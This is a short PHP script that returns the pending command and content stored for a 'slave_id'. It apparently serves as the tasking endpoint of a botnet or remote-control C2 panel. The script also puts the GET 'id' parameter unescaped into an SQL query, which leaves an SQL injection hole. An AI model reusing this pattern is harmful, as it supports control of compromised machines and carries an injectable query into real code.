<?
include("../includes/configuration.inc.php");
include("../includes/mysql_connect.inc.php");
$userid = $_GET['id'];
$get_id = "SELECT command,content FROM commands WHERE slave_id='$userid' and status='pending'";
$result_check = mysql_query($get_id, $connect);
while($row = mysql_fetch_array($result_check)){
     $command =  $row[0];
	 $content = $row[1];
}
if(isset($_GET['cmd']))
{
echo $command;
}
elseif (isset($_GET['content']))
{
echo $content;
}
?>